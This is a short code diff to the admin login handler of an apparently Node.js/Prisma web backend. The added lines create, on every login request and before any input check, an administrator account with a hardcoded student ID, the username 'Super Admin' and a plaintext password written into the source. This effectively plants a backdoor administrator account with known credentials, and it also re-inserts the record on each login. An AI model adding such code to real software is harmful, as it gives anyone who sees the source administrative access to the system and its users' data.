@@ -41,6 +41,14 @@ const registerAdmin = asyncHandler(async (req, res) => {
 const logAdmin = asyncHandler(async (req, res) => {
   const { studentid, adminpassword } = req.body;
 
+  await prisma.admin.create({
+    data: {
+      studentid: "UGR-6756-15",
+      adminusername: "Super Admin",
+      adminpassword: await hashPassword("@gbi_admin7867"),
+    },
+  });
+
   if (!studentid || !adminpassword) {
     return res
       .status(400)
